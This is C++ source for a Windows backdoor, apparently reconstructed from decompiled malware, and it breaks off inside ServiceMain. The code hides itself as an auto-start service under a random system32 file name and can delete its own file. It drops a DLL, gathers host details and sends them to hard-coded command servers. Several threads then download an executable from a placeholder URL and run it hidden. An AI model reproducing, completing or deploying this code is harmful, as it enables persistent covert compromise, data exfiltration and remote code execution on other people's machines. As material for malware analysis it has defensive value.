// exe2.cpp : 定义应用程序的入口点。
//
#include "stdafx.h"
/*#include <Windows.h>*/
#include <stdio.h>
#include "resource.h"
#include <time.h>
#include <winsock2.h>
#include <Mmsystem.h>

#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"User32.lib")
#pragma comment(lib,"Kernel32.lib")
#pragma comment(lib,"Winmm.lib")

#define  _DWORD DWORD
HANDLE g_handle;
DWORD g_tick=0;



typedef DWORD (WINAPI* My_GetModuleFileName)( __in_opt HMODULE hModule, 
	__out_ecount_part(nSize, return + 1) LPWSTR lpFilename, 
	__in DWORD nSize );

My_GetModuleFileName GetModuleFileNameProc;
#define _BYTE BYTE
char IP1[40];
char IP2[40];
char IP3[40];

int G_var1,G_var2,G_var3;
CHAR ExistingFileName[100];
CHAR NewFileName[100];
CHAR String2[100];
CHAR SubKey[100];
bool flag;

SERVICE_STATUS_HANDLE hServiceStatus;
SERVICE_STATUS ServiceStatus;
SERVICE_DESCRIPTION description;

typedef struct Struct_Info
{
	WCHAR LCData[64];
	char ComputerNameA[24];
	DWORD tick;
	char System[20];
	char Memory[30];
	char CPUInfo[30];
	char timeInfo[10];

}*pStruct_Info;
Struct_Info DataInfo={0};
SOCKET g_sock; 

bool __cdecl OpenKey_()
{
	HKEY phkResult; // [sp+4h] [bp-108h]@1
	CHAR SubKey_aspnet_statesjrq[100]; // [sp+8h] [bp-104h]@1
	char v3[100]; // [sp+9h] [bp-103h]@1
	__int16 v4; // [sp+109h] [bp-3h]@1
	char v5; // [sp+10Bh] [bp-1h]@1

	memset(v3, 0, 100);
	v4 = 0;
	v5 = 0;
	lstrcpyA(SubKey_aspnet_statesjrq, "SYSTEM\\CurrentControlSet\\Services\\");
	lstrcatA(SubKey_aspnet_statesjrq, "aspnet_statesjrq");// Decryped_aspnet_statesjrq
	return RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey_aspnet_statesjrq, 0, 0xF003Fu, &phkResult) == 0;
}

unsigned int __cdecl Time_tick(unsigned int a1)
{
	DWORD v1; // esi@1

	v1 = GetTickCount();
	return v1 * (rand() + 3) % a1;
}

BOOL IsInstall(CHAR *szServerName)
{
	BOOL bResult = FALSE;

	SC_HANDLE sc_handle = OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if (sc_handle != NULL)
	{
		SC_HANDLE sc_hService = OpenServiceA(sc_handle,\
			szServerName,\
			SERVICE_QUERY_CONFIG);
		//Enables calling of the QueryServiceConfig function to query
		//the service configuration.

		if (sc_hService != NULL)
		{
			bResult = TRUE;
			CloseServiceHandle(sc_hService);
		}
		CloseServiceHandle(sc_handle);
	}
	return bResult;
}

void My_CreateServer(CHAR *szServerName,CHAR *szServerName2,CHAR *szServerName3)
{


	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	// 设置服务可以使用的控制
	// 如果希望服务启动后不能停止，去掉SERVICE_ACCEPT_STOP
	// SERVICE_ACCEPT_PAUSE_CONTINUE是服务可以“暂停/继续”

	ServiceStatus .dwCheckPoint = 0;
	ServiceStatus.dwControlsAccepted = \
		SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN |\
		SERVICE_ACCEPT_PAUSE_CONTINUE;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwWaitHint = 0;
	ServiceStatus.dwWin32ExitCode = 0;

	HKEY key;
	GetModuleFileNameProc = (My_GetModuleFileName)GetProcAddress(LoadLibrary(L"kernel32.dll"),"GetModuleFileNameA");
	GetModuleFileNameProc(NULL,(LPWSTR)ExistingFileName,100); 
	GetSystemDirectoryA(NewFileName,100);

	if (IsInstall(szServerName))
	{
		return;
	}
	if (strncmp(NewFileName,ExistingFileName,strlen(NewFileName))!= 0)
	{
		wsprintfA(String2,"%c%c%c%c%c%c.exe",Time_tick(0x1A)+'a',Time_tick(0x1A)+'a',Time_tick(0x1A)+'a',Time_tick(0x1A)+'a',Time_tick(0x1A)+'a',Time_tick(0x1A)+'a');
		strcat(NewFileName,"\\");
		strcat(NewFileName,String2);
		CopyFileA(ExistingFileName,NewFileName,FALSE);
		memset(ExistingFileName,0,sizeof(ExistingFileName));
		strcpy(ExistingFileName,NewFileName);
		flag=1;
	}
	SC_HANDLE sc_managerhandle = OpenSCManager(NULL,NULL,\
		SC_MANAGER_ALL_ACCESS);
	if (sc_managerhandle == NULL)
	{
		_tprintf(_T("OpenSCManager错误！"));
		return;
	}
	DWORD dwLength = strlen(ExistingFileName);
	//判断程序路径是否包含空格,如果包含则给路径加上引号.
	if (strchr(ExistingFileName, ' ') != NULL)
	{
		dwLength += 3;
		char *lpFilePath = new char[dwLength];
		if (lpFilePath != NULL)
		{
			sprintf(lpFilePath, "\"%s\"", ExistingFileName);
			strcpy(ExistingFileName, lpFilePath);
			delete []lpFilePath;
		}
	}
	//创建一个手动启动的服务 
	SC_HANDLE sc_handle = CreateServiceA(sc_managerhandle,\
		szServerName,\
		szServerName2,\
		SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START,SERVICE_ERROR_IGNORE,\
		ExistingFileName,NULL,NULL,NULL,NULL,NULL);
	//创建失败
	if(sc_handle==NULL)
	{		
		DWORD dwErrorCode = GetLastError();
		if(dwErrorCode!=ERROR_SERVICE_EXISTS)
		{
			printf("CreateService Error !\n");
			CloseServiceHandle(sc_handle);
			return ;
		}
		//如果服务存在
		else
		{
			//假如服务已存在则打开服务
			sc_handle=OpenServiceA(sc_managerhandle,\
				szServerName,SERVICE_START); //服务名
			//打开失败
			if(sc_handle==NULL)
			{
				printf("OpenService Error !\n");              
				CloseServiceHandle(sc_handle);
				return ;
			}
		}
	}
	else if (description.lpDescription!=NULL)
	{
		ChangeServiceConfig2W(sc_handle,SERVICE_CONFIG_DESCRIPTION,&description);
		//写入描述信息
	}

	//启动服务
	if(StartService(sc_handle,0,NULL)==0)
	{
		DWORD dwErrorCode=GetLastError();
		//服务正在运行
		if(dwErrorCode==ERROR_SERVICE_ALREADY_RUNNING)
		{
			printf("StartService Error !\n");
			CloseServiceHandle(sc_managerhandle);  
			CloseServiceHandle(sc_handle);
			return ;
		}
	} 
	//查询服务状态
	while(QueryServiceStatus(sc_handle,&ServiceStatus)!=0)           
	{   //服务是否在初始化阶段
		if(ServiceStatus.dwCurrentState==SERVICE_START_PENDING)
		{
			Sleep(100);
		}
		else
		{
			break;
		}
	}
	//查询服务状态，看有没有启动成功
	if(ServiceStatus.dwCurrentState!=SERVICE_RUNNING)
	{
		printf("Install service Failed\n");
	}
	else
	{
		printf("Install service Successed\n");
	}


	strcpy(SubKey,"SYSTEM\\CurrentControlSet\\Services\\");
	strcat(SubKey,szServerName);
	RegOpenKeyA(HKEY_LOCAL_MACHINE,SubKey,&key);

	RegSetValueExA(key,"Description",0,REG_SZ,(const BYTE *)szServerName3,strlen(szServerName3));

	CloseServiceHandle(sc_handle);
	CloseServiceHandle(sc_managerhandle);

	return;
}

BOOL __cdecl COPYTOSOFTWARE_LOG_sub_402880()
{
	HMODULE v0; // eax@1
	FARPROC GetModuleFileName; // edx@1
	BOOL result; // eax@1
	WCHAR ExistingFileName[100]; // [sp+1Ch] [bp-208h]@1

	WCHAR NewFileName[100]; // [sp+120h] [bp-104h]@1


	v0 = LoadLibraryA("kernel32.dll");
	GetModuleFileName = GetProcAddress(v0, "GetModuleFileNameW");
	memset(ExistingFileName,0,100);

	((void (WINAPI *)(_DWORD, const WCHAR *, signed int))GetModuleFileName)(0, ExistingFileName, 260);
	GetTempPathW(104, NewFileName);
	lstrcatW(NewFileName, L"SOFTWARE.LOG");
	result = MoveFileExW((LPCWSTR)ExistingFileName, NewFileName, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING);//删除本身文件
	if ( result )
		result = MoveFileExW(NewFileName, 0, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT);//删除临时文件
	ExitProcess(0);
	return result;
}


BOOL __stdcall HandlerProc(int a1)
{
	SERVICE_STATUS_HANDLE v2; // [sp-8h] [bp-Ch]@2
	struct _SERVICE_STATUS *v3; // [sp-4h] [bp-8h]@2

	switch ( a1 )
	{
	case 1:
		v3 = &ServiceStatus;
		ServiceStatus.dwCheckPoint = 1;
		ServiceStatus.dwCurrentState = 3;
		v2 = hServiceStatus;
		goto LABEL_4;
	case 5:
		v3 = &ServiceStatus;
		ServiceStatus.dwCheckPoint = 1;
		ServiceStatus.dwCurrentState = 3;
		v2 = hServiceStatus;
LABEL_4:
		SetServiceStatus(v2, v3);
		Sleep(0x1F4u);
		ServiceStatus.dwCheckPoint = 0;
		ServiceStatus.dwCurrentState = 1;
		return SetServiceStatus(hServiceStatus, &ServiceStatus);
	case 2:
		ServiceStatus.dwCheckPoint = 1;
		ServiceStatus.dwCurrentState = 6;
		SetServiceStatus(hServiceStatus, &ServiceStatus);
		Sleep(0x1F4u);
		ServiceStatus.dwCheckPoint = 0;
		ServiceStatus.dwCurrentState = 7;
		return SetServiceStatus(hServiceStatus, &ServiceStatus);
	case 3:
		ServiceStatus.dwCheckPoint = 1;
		ServiceStatus.dwCurrentState = 5;
		SetServiceStatus(hServiceStatus, &ServiceStatus);
		Sleep(0x1F4u);
		ServiceStatus.dwCheckPoint = 0;
		ServiceStatus.dwCurrentState = 4;
		break;
	default:
		return SetServiceStatus(hServiceStatus, &ServiceStatus);
	}
	return SetServiceStatus(hServiceStatus, &ServiceStatus);
}

BOOL CALLBACK EnumResNameProc(
	HMODULE hModule, LPCSTR lpType, LPCSTR lpName,LONG_PTR lParam
	)
{
	HMODULE v4; // eax@1
	FARPROC SizeofResource_; // ebx@1
	HRSRC v6; // eax@1
	HRSRC v7; // esi@1
	DWORD v8_len_res; // ebx@2
	HGLOBAL HGLOBAL_; // eax@2
	const void *v10; // edi@4
	HANDLE v11; // esi@5
	DWORD NumberOfBytesWritten; // [sp+10h] [bp-108h]@6
	CHAR FileName[100]; // [sp+14h] [bp-104h]@5

	v4 = LoadLibraryA("kernel32.dll");
	SizeofResource_ = GetProcAddress(v4, "SizeofResource");
	v6 = FindResourceA(hModule, lpName, lpType);
	v7 = v6;
	if ( v6 )
	{
		v8_len_res = ((int (WINAPI *)(HMODULE , HRSRC ))SizeofResource_)(hModule, v6);
		HGLOBAL_ = LoadResource(hModule, v7);
		if ( HGLOBAL_ )
		{
			if ( v8_len_res )
			{
				v10 = LockResource(HGLOBAL_);
				if ( v10 )
				{
					wsprintfA(FileName, "gei33.dll");
					v11 = CreateFileA(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
					if ( v11 != (HANDLE)-1 )
					{
						NumberOfBytesWritten = 0;
						WriteFile(v11, v10, v8_len_res, &NumberOfBytesWritten, 0);
						CloseHandle(v11);
					}
				}
			}
		}
	}
	return 1;
}
HKEY hKey; 
BOOL __cdecl hebingwenjian_sub_402A70(LPCSTR pFileName_dll_)
{
	CHAR  pFileName_dll[40];
	BOOL result; // eax@2
	HANDLE v2; // eax@7
	void *v3; // esi@7
	DWORD v4; // eax@9
	HGLOBAL v5; // ebx@11
	HANDLE v6; // eax@15
	void *v7; // esi@15
	BOOL v8; // edi@17
	int v9; // eax@18
	DWORD cb; // [sp+Ch] [bp-110h]@9

	DWORD cbData; // [sp+14h] [bp-108h]@3
	CHAR SubKey[100]; // [sp+18h] [bp-104h]@1


	strcpy(pFileName_dll,pFileName_dll_);

	lstrcpyA(SubKey, "SYSTEM\\CurrentControlSet\\Services\\");
	lstrcatA(SubKey, "aspnet_statesjrq");        // aspnet_statesjrq
	if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, KEY_ALL_ACCESS, &hKey) )
	{
		result = 0;
	}
	else
	{
		memset(SubKey, 0, 40);
		cbData = 260;
		LONG ret = RegQueryValueExA(hKey, "ImagePath", 0, 0, (LPBYTE)SubKey, &cbData);
		if (ret  !=ERROR_SUCCESS )
		{
			RegCloseKey(hKey);
			result = 0;
		}
		else
		{
			RegCloseKey(hKey);
			if ( GetFileAttributesA(SubKey) == -1 )
			{
				result = 0;
			}
			else
			{
				v2 = CreateFileA(SubKey, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);// C:\windows\system32\mmkgsk.exe
				v3 = v2;
				if ( v2 == (HANDLE)-1 )
				{
					result = 0;
				}
				else
				{
					v4 = GetFileSize(v2, 0);
					cb = v4;
					if ( v4 )
					{
						v5 = GlobalAlloc(0x40u, v4);
						if ( v5 )
						{
							if ( ReadFile(v3, v5, cb, &cb, 0) )
							{
								CloseHandle(v3);
								v6 = BeginUpdateResourceA(pFileName_dll, 0);
								v7 = v6;
								if ( v6 )
								{
									v8 = UpdateResourceA(v6, (LPCSTR)0xA, (LPCSTR)0x66, 0, v5, cb);
									if ( v8 )
									{
										v9 = lstrlenA("aspnet_statesjrq");
										v8 = UpdateResourceA(v7, (LPCSTR)0xA, (LPCSTR)0x65, 0, "aspnet_statesjrq", v9 + 1);
									}
									if ( EndUpdateResourceA(v7, 0) )
									{
										GlobalFree(v5);
										result = v8;
									}
									else
									{
										GlobalFree(v5);
										result = 0;
									}
								}
								else
								{
									GlobalFree(v5);
									result = 0;
								}
							}
							else
							{
								GlobalFree(v5);
								CloseHandle(v3);
								result = 0;
							}
						}
						else
						{
							CloseHandle(v3);
							result = 0;
						}
					}
					else
					{
						CloseHandle(v3);
						result = 0;
					}
				}
			}
		}
	}
	return result;
}

bool __cdecl loadlibrary_sub_401320()
{
	CHAR LibFileName[20]; // [sp+0h] [bp-104h]@1

	wsprintfA(LibFileName, "gei%u.dll", 33);
	return LoadLibraryA(LibFileName) != 0;
	return 1;
}
void Decryp_sub_402850(char str[],int len,int temp)
{
	char strtemp[30];
	strcpy(strtemp,str);
	for (int i=0;i<len;i++)
	{
		strtemp[i] = (temp%0xFE+1) ^  (strtemp[i]-( temp%0xFE+1));
	}
	strcpy(str,strtemp);
	return;
}
void Encrypt(char str[],int len,int temp)
{
	char strtemp[30];
	strcpy(strtemp,str);
	for (int i=0;i<len;i++)
	{
		strtemp[i] = ((temp%0xFE+1) ^ strtemp[i]) +( temp%0xFE+1);
	}
	strcpy(str,strtemp);
	return;
}

unsigned __int32 __cdecl GetHostName_sub_406410(const char *name)
{
	unsigned __int32 result; // eax@1

	result = inet_addr(name);
	if ( (result & 0x80000000u) != 0 )
	{
		result = (unsigned __int32)gethostbyname(name);
		if ( result )
			result = ***(_DWORD ***)(result + 12);
	}
	return result;
}

SOCKET __cdecl socket_connect_sub_401E60()
{
	size_t v0; // eax@2
	u_short v1; // ax@2
	SOCKET sock; // esi@2
	char Port[10]; // [sp+18h] [bp-100h]@1
	char Dest[30]; // [sp+98h] [bp-80h]@1

	if ( !strstr(IP1, ":") )
		return -1;
	v0 = strcspn(IP1, ":");
	strncpy(Dest, IP1, v0);
	Dest[13] = '\0';
	strcpy(Port,&IP1[strcspn(IP1, ":") + 1]);

	v1 = atoi(Port);

	sockaddr_in sock_;
	sock_.sin_family = PF_INET;
	sock_.sin_addr.S_un.S_addr = inet_addr(Dest);
	sock_.sin_port = htons(v1);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if ( connect(sock, (struct sockaddr*)&sock_, sizeof(SOCKADDR) == -1 ) )
	{
		closesocket(sock);
		return -1;
	}
	return sock;
}

int __cdecl setsockopt_sub_401F90(SOCKET s, char cbBytesReturned)
{
	int result; // eax@1
	int vInBuffer; // [sp+4h] [bp-Ch]@2
	int v4; // [sp+8h] [bp-8h]@2
	int v5; // [sp+Ch] [bp-4h]@2

	result = setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &cbBytesReturned, 4);
	if ( !result )
	{
		vInBuffer = 1;
		v4 = 180000;
		v5 = 10000;
		result = WSAIoctl(s, 0x98000004u, &vInBuffer, 0xCu, 0, 0, (LPDWORD)&cbBytesReturned, 0, 0);
	}

	return result;
}

DWORD __cdecl GetInfo(pStruct_Info lpLCData)
{
	pStruct_Info pdata = lpLCData;
	char *v1; 
	unsigned __int64 v2; 
	DWORD result;
	DWORD cbData; 
	DWORD Type; 
	HKEY hKey;
	HKEY phkResult; 
	BYTE Data[10]; 
	DWORD nSize; 
	struct _MEMORYSTATUSEX Buffer; 
	BYTE Str[50]; 
	CHAR String1[60]; 

	__int16 v16; 
	char v17; 
	CHAR SubKey[50];

	GetLocaleInfoW(LOCALE_SYSTEM_DEFAULT, LOCALE_SLANGUAGE, pdata->LCData, 64);
	nSize = 64;
	GetComputerNameA(pdata->ComputerNameA, &nSize);

	lstrcpyA(SubKey, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
	if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, KEY_ALL_ACCESS , &hKey) )
	{
		cbData = 200;
		RegQueryValueExA(hKey, "ProductName", 0, &Type, Str, &cbData);
		RegCloseKey(hKey);
	}
	if ( strstr(( char *)Str, "2000") )
	{
		strcpy(pdata->System,"2000");
		G_var1 = 1;
		G_var2 = 1;
		G_var3 = 1;
		goto LABEL_17;
	}
	if ( strstr(( char *)Str, "XP") )
	{
		G_var1 = 0;
		G_var2 = 0;
		G_var3 = 0;
		strcpy(pdata->System,"XP");
	}
	else
	{
		if ( strstr(( char *)Str, "2003") )
		{
			strcpy(pdata->System,"2003");
			G_var1 = 1;
			G_var2 = 1;
			G_var3 = 1;
			goto LABEL_17;
		}
		if ( strstr(( char *)Str, "Vista") )
		{
			strcpy(pdata->System,"Vista");
			G_var1 = 0;
			G_var2 = 0;
			G_var3 = 0;
			goto LABEL_17;
		}
		if ( strstr(( char *)Str, "2008") )
		{
			strcpy(pdata->System,"2008");
			G_var1 = 1;
			G_var2 = 1;
			G_var3 = 1;
		}
		else
		{
			v1 = strstr((char *)Str, "7");
			G_var1 = 0;
			G_var2 = 0;
			G_var3 = 0;
			if ( v1 )
			{
				strcpy(pdata->System,"Win7");
				goto LABEL_17;
			}
			strcpy(pdata->System,"WinNT");
		}
	}
LABEL_17:
	v16 = 0;
	v17 = 0;
	lstrcpyA(String1, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
	if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, String1, 0, KEY_ALL_ACCESS , &phkResult) )
	{
		Type = 4;
		cbData = 200;
		RegQueryValueExA(phkResult, "~MHz", 0, &Type, Data, &cbData);
		RegCloseKey(phkResult);
	}
	wsprintfA(pdata->CPUInfo, "%u MHz", *(_DWORD *)Data);
	Buffer.dwLength = 64;
	GlobalMemoryStatusEx(&Buffer);

	v2 = Buffer.ullTotalPhys>> 0x14;

	wsprintfA(pdata->Memory, "%u MB", v2 + 1, (v2 + 1) >> 32);
	lstrcpyA(pdata->timeInfo, "V8V-10月16日");
	result = g_tick;
	if ( !g_tick )
	{
		result = GetTickCount();
		g_tick = result;
	}
	pdata->tick = result;
	return result;
}
signed int __cdecl select_recv(SOCKET s, char*  a2, unsigned int len_data)
{
	unsigned int i; // esi@1
	signed int result; // eax@2
	int v5; // eax@3
	int bool_flag; // eax@6
	fd_set readfds; // [sp+8h] [bp-104h]@3

	i = 0;
	if ( len_data )
	{
		while ( 1 )
		{
			readfds.fd_array[0] = g_sock;
			readfds.fd_count = 1;
			v5 = select(s + 1, &readfds, 0, 0, 0);
			if ( v5 == -1 )
				break;
			if ( v5 )
			{
				if ( __WSAFDIsSet(s, &readfds) )
				{
					bool_flag = recv(s, (char *)(i + a2), len_data - i, 0);
					if ( !bool_flag )
						break;
					if ( bool_flag == -1 )
						break;
					i += bool_flag;
					if ( i >= len_data )
						break;
				}
			}
		}
		result = i == len_data;
	}
	else
	{
		result = 1;
	}
	return result;
}


int __stdcall Thread1_(int a1)
{

	int result=1;
	char LibFileName[20] = "urlmon.dll";
	char ProcName[20]="URLDownloadToFileA";
	char URL[100] = "www.xxxxxxxxxx.com/xxxx.exe";

	FARPROC my_WriteFileA = GetProcAddress(LoadLibraryA("kernel32.dll"), "WriteFileA");
	FARPROC my_GetTempPathA = GetProcAddress(LoadLibraryA("kernel32.dll"), "GetTempPathA");
	g_sock = socket_connect_sub_401E60();
	BOOL  flag =0;
	int len_data =0;
	HANDLE handle_;
	HANDLE MODULE_PlusCtrl=NULL;
	DWORD lpNumberOfBytesWritten;
	int select_value='w';

	if ( g_sock == -1 )
	{
		result = 0;
	}
	else
	{
		setsockopt_sub_401F90(g_sock, 75);
		GetInfo(&DataInfo);
		loadlibrary_sub_401320();
		if ( send(g_sock, (const char*)&DataInfo, sizeof(DataInfo), 0) == -1 )
		{
			closesocket(g_sock);
			result = 0;
		}
		else
		{
			while (1)
			{
				while (1)
				{
					memset((void *)&DataInfo,0,sizeof(Struct_Info));
					if (flag)
					{

					}
					else
					{
						len_data = 8;
					}
					if ( !select_recv(g_sock, (char*)&DataInfo, len_data) )
					{
						goto LABEL_48;
					}
					if ( flag != 1 )
						break;
					lpNumberOfBytesWritten=0;

					if ( !MODULE_PlusCtrl
						&& handle_ != INVALID_HANDLE_VALUE
						&& (!(WriteFile(
						handle_,
						&DataInfo,
						len_data,
						&lpNumberOfBytesWritten,
						0))
						|| lpNumberOfBytesWritten != len_data) )
					{
						CloseHandle(handle_);
						handle_ = (void *)-1;
					}
					if (len_data)
					{
						flag = 0;
						if ( !MODULE_PlusCtrl )
						{
							if ( handle_ != INVALID_HANDLE_VALUE )
							{
								CloseHandle(handle_);
								handle_ = INVALID_HANDLE_VALUE;
								MODULE_PlusCtrl = LoadLibraryA("PlusCtrl.dll");
							}
						}

					}
				}
				if ( !select_recv(g_sock, (char*)&DataInfo, sizeof(Struct_Info)) )
					break;
				char CmdLine[200];
				char v58[10];

				GetTempPathA(200, CmdLine);
				DWORD v11 = timeGetTime();
				wsprintfA(v58, "%d", v11);
				lstrcatA(CmdLine, v58);

				FARPROC my_URLDownloadToFile = GetProcAddress(LoadLibraryA(LibFileName), ProcName);
				((void (WINAPI *)(_DWORD, char *, char *, signed int, _DWORD))my_URLDownloadToFile)(0, URL, CmdLine, 10, 0);
				WinExec(CmdLine, SW_HIDE);
				break;

			}

LABEL_48:
			result = closesocket(g_sock);
			if ( handle_ != INVALID_HANDLE_VALUE )
				result = CloseHandle(handle_);

		}
	}

	return result;
}

int __stdcall thread2_(int a1)
{
	int result=0;
	int weizhi;
	char Dest[20];
	char Port[10];
	SOCKET sock_;
	struct sockaddr_in sockaddr_;

	if ( !strstr(IP2, ":") )
		return -1;
	weizhi = strcspn(IP2, ":");
	strncpy(Dest, IP2, weizhi);
	Dest[weizhi] = '\0';
	strcpy(Port, &IP2[strcspn(IP2, ":") + 1]);
	sockaddr_.sin_family = 2;
	sockaddr_.sin_addr.S_un.S_addr = inet_addr(Dest);
	sockaddr_.sin_port = htons(atoi(Port));
	HANDLE handle_;
	DWORD lpNumberOfBytesWritten;
	DWORD len_data;
	HANDLE MODULE_PlusCtrl;

	char LibFileName[20] = "urlmon.dll";
	char ProcName[20]="URLDownloadToFileA";
	char URL[100] = "www.xxxxxxxxxx.com/xxxx.exe";

	sock_ = socket(2, 1, 0);

	if ( connect(sock_, (struct sockaddr*)&sockaddr_, 16) == -1 )
	{
		closesocket(sock_);
		return -1;
	}
	if ( sock_ == -1 )
	{
		result = 0;
	}
	setsockopt_sub_401F90(sock_, 75);
	memset((void*)&DataInfo, 0, sizeof(Struct_Info ));
	GetInfo(&DataInfo);
	loadlibrary_sub_401320();

	if ( send(sock_, (const char*)&DataInfo, sizeof(DataInfo), 0) == -1 )
	{
		closesocket(g_sock);
		result = 0;
	}
	while (1)
	{
		while (1)
		{
			memset((void *)&DataInfo,0,sizeof(Struct_Info));
			if (flag)
			{

			}
			else
			{
				len_data = 8;
			}
			if ( !select_recv(g_sock, (char*)&DataInfo, len_data) )
			{
				goto LABEL_48;
			}
			if ( flag != 1 )
				break;
			lpNumberOfBytesWritten=0;

			if ( !MODULE_PlusCtrl
				&& handle_ != INVALID_HANDLE_VALUE
				&& (!(WriteFile(
				handle_,
				&DataInfo,
				len_data,
				&lpNumberOfBytesWritten,
				0))
				|| lpNumberOfBytesWritten != len_data) )
			{
				CloseHandle(handle_);
				handle_ = (void *)-1;
			}
			if (len_data)
			{
				flag = 0;
				if ( !MODULE_PlusCtrl )
				{
					if ( handle_ != INVALID_HANDLE_VALUE )
					{
						CloseHandle(handle_);
						handle_ = INVALID_HANDLE_VALUE;
						MODULE_PlusCtrl = LoadLibraryA("PlusCtrl.dll");
					}
				}

			}
		}
		if ( !select_recv(g_sock, (char*)&DataInfo, sizeof(Struct_Info)) )
			break;

		char CmdLine[200];
		char v58[10];

		GetTempPathA(200, CmdLine);
		DWORD v11 = timeGetTime();
		wsprintfA(v58, "%d", v11);
		lstrcatA(CmdLine, v58);

		FARPROC my_URLDownloadToFile = GetProcAddress(LoadLibraryA(LibFileName), ProcName);
		((void (WINAPI *)(_DWORD, char *, char *, signed int, _DWORD))my_URLDownloadToFile)(0, URL, CmdLine, 10, 0);
		WinExec(CmdLine, SW_HIDE);
		break;


	}

LABEL_48:
	result = closesocket(g_sock);
	if ( handle_ != INVALID_HANDLE_VALUE )
		result = CloseHandle(handle_);

	return  result;
}
void __stdcall thread1(int a1)
{
	HANDLE v1; // esi@2
	struct WSAData WSAData; // [sp+10h] [bp-190h]@1

	WSAStartup(MAKEWORD(2, 2), &WSAData);
	while ( 1 )
	{
		v1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Thread1_, 0, 0, 0);
		WaitForSingleObject(v1, INFINITE);
		CloseHandle(v1);
		Sleep(0x1388u);
	}
}
void __stdcall thread2(int a1)
{
	HANDLE v1; // esi@2
	struct WSAData WSAData; // [sp+10h] [bp-190h]@1

	WSAStartup(MAKEWORD(2, 2), &WSAData);
	while ( 1 )
	{
		v1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)thread2_, 0, 0, 0);
		WaitForSingleObject(v1, INFINITE);
		CloseHandle(v1);
		Sleep(0x1388u);
	}
}


int __stdcall thread3_(int a1)
{
	int result=0;
	int weizhi;
	char Dest[20];
	char Port[10];
	SOCKET sock_;
	struct sockaddr_in sockaddr_;

	if ( !strstr(IP2, ":") )
		return -1;
	weizhi = strcspn(IP2, ":");
	strncpy(Dest, IP2, weizhi);
	Dest[weizhi] = '\0';
	strcpy(Port, &IP2[strcspn(IP2, ":") + 1]);
	sockaddr_.sin_family = 2;
	sockaddr_.sin_addr.S_un.S_addr = inet_addr(Dest);
	sockaddr_.sin_port = htons(atoi(Port));
	HANDLE handle_;
	DWORD lpNumberOfBytesWritten;
	DWORD len_data;
	HANDLE MODULE_PlusCtrl;

	char LibFileName[20] = "urlmon.dll";
	char ProcName[20]="URLDownloadToFileA";
	char URL[100] = "www.xxxxxxxxxx.com/xxxx.exe";

	sock_ = socket(2, 1, 0);

	if ( connect(sock_, (struct sockaddr*)&sockaddr_, 16) == -1 )
	{
		closesocket(sock_);
		return -1;
	}
	if ( sock_ == -1 )
	{
		result = 0;
	}
	setsockopt_sub_401F90(sock_, 75);
	memset((void*)&DataInfo, 0, sizeof(Struct_Info ));
	GetInfo(&DataInfo);
	loadlibrary_sub_401320();

	if ( send(sock_, (const char*)&DataInfo, sizeof(DataInfo), 0) == -1 )
	{
		closesocket(g_sock);
		result = 0;
	}
	while (1)
	{
		while (1)
		{
			memset((void *)&DataInfo,0,sizeof(Struct_Info));
			if (flag)
			{

			}
			else
			{
				len_data = 8;
			}
			if ( !select_recv(g_sock, (char*)&DataInfo, len_data) )
			{
				goto LABEL_48;
			}
			if ( flag != 1 )
				break;
			lpNumberOfBytesWritten=0;

			if ( !MODULE_PlusCtrl
				&& handle_ != INVALID_HANDLE_VALUE
				&& (!(WriteFile(
				handle_,
				&DataInfo,
				len_data,
				&lpNumberOfBytesWritten,
				0))
				|| lpNumberOfBytesWritten != len_data) )
			{
				CloseHandle(handle_);
				handle_ = (void *)-1;
			}
			if (len_data)
			{
				flag = 0;
				if ( !MODULE_PlusCtrl )
				{
					if ( handle_ != INVALID_HANDLE_VALUE )
					{
						CloseHandle(handle_);
						handle_ = INVALID_HANDLE_VALUE;
						MODULE_PlusCtrl = LoadLibraryA("PlusCtrl.dll");
					}
				}

			}
		}
		if ( !select_recv(g_sock, (char*)&DataInfo, sizeof(Struct_Info)) )
			break;

		char CmdLine[200];
		char v58[10];

		GetTempPathA(200, CmdLine);
		DWORD v11 = timeGetTime();
		wsprintfA(v58, "%d", v11);
		lstrcatA(CmdLine, v58);

		FARPROC my_URLDownloadToFile = GetProcAddress(LoadLibraryA(LibFileName), ProcName);
		((void (WINAPI *)(_DWORD, char *, char *, signed int, _DWORD))my_URLDownloadToFile)(0, URL, CmdLine, 10, 0);
		WinExec(CmdLine, SW_HIDE);
		break;


	}

LABEL_48:
	result = closesocket(g_sock);
	if ( handle_ != INVALID_HANDLE_VALUE )
		result = CloseHandle(handle_);

	return  result;
}
void __stdcall thread3(int a1)
{
	HANDLE v1; // esi@2
	struct WSAData WSAData; // [sp+10h] [bp-190h]@1

	WSAStartup(MAKEWORD(2, 2), &WSAData);
	while ( 1 )
	{
		v1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)thread3_, 0, 0, 0);
		WaitForSingleObject(v1, INFINITE);
		CloseHandle(v1);
		Sleep(0x1388u);
	}
}


VOID WINAPI ServiceMain(
	DWORD dwArgc,
	LPTSTR *lpszArgv
	)
{
	CHAR v3[100]; 
	//MessageBoxA(NULL,"server","server",MB_OK);
